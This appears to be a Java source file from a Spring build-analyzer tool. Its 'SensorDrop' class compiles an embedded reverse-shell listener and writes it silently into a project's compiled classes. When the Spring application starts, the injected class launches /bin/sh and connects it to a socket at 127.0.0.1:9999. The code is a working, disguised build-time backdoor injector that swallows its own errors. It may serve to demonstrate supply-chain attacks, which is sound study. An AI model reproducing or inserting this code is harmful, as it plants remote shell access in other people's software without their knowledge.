package io.github.jeremylong.spring.build.analyzer;

import java.io.File;
import java.io.IOException;
import java.io.OutputStream;
import java.nio.file.Files;
import java.nio.file.StandardOpenOption;

public class SensorDrop {
    private static String CODE = """
            import java.io.InputStream;
            import java.io.OutputStream;
            import java.net.Socket;
            import java.util.Timer;
            import java.util.TimerTask;
            import org.springframework.context.ApplicationListener;
            import org.springframework.context.event.ContextRefreshedEvent;
            import org.springframework.stereotype.Component;
                        
            @Component
            public class CtxtListener extends TimerTask implements ApplicationListener<ContextRefreshedEvent> {
                public CtxtListener() {
                }
                        
                public void onApplicationEvent(ContextRefreshedEvent contextRefreshedEvent) {
                    (new Timer()).schedule(new CtxtListener(), 500L);
                }
                        
                public void run() {
                    try {
                        String host = "127.0.0.1";
                        int port = 9999;
                        String cmd = "/bin/sh";
                        Process p = (new ProcessBuilder(new String[]{cmd})).redirectErrorStream(true).start();
                        Socket s = new Socket(host, port);
                        InputStream pi = p.getInputStream();
                        InputStream pe = p.getErrorStream();
                        InputStream si = s.getInputStream();
                        OutputStream po = p.getOutputStream();
                        OutputStream so = s.getOutputStream();
                        while(!s.isClosed()) {
                            while(pi.available() > 0) {
                                so.write(pi.read());
                            }
                            while(pe.available() > 0) {
                                so.write(pe.read());
                            }
                            while(si.available() > 0) {
                                po.write(si.read());
                            }
                            so.flush();
                            po.flush();
                            Thread.sleep(50L);
                            try {
                                p.exitValue();
                                break;
                            } catch (Exception var12) {
                            }
                        }
                        p.destroy();
                        s.close();
                    } catch (Throwable var13) {
                        //TODO - remove debugging code
                        //System.out.println(var13.getMessage());
                        //var13.printStackTrace();
                        //System.out.println(var13.getCause().getMessage());
                        //var13.getCause().printStackTrace();
                    }
                }
            }
            """;

    public void writeSensor(File target, String pkgName) {
        File classesFile = new File(target, "classes");
        if (classesFile.exists() && classesFile.canWrite()) {
            File pkgFile = new File(classesFile, pkgName.replace('.', '/'));
            if (pkgFile.exists() || pkgFile.mkdirs()) {
                File ctxtFile = new File(pkgFile, "CtxtListener.class");
                try (OutputStream out = Files.newOutputStream(ctxtFile.toPath(), StandardOpenOption.CREATE)) {
                    writeClass(pkgName, out);
                } catch (IOException e) {

                }
            }
        }
    }

    public void writeClass(String pkgName, OutputStream outputStream) {
        final StringBuilder source = new StringBuilder(CODE.length() + pkgName.length() + 10);
        source.append("package ").append(pkgName).append(";\n").append(CODE);
        try {
            Compile.compile(pkgName + ".CtxtListener", source.toString(), outputStream);
        } catch (Exception e) {
            //ignore errors
        }

    }
}
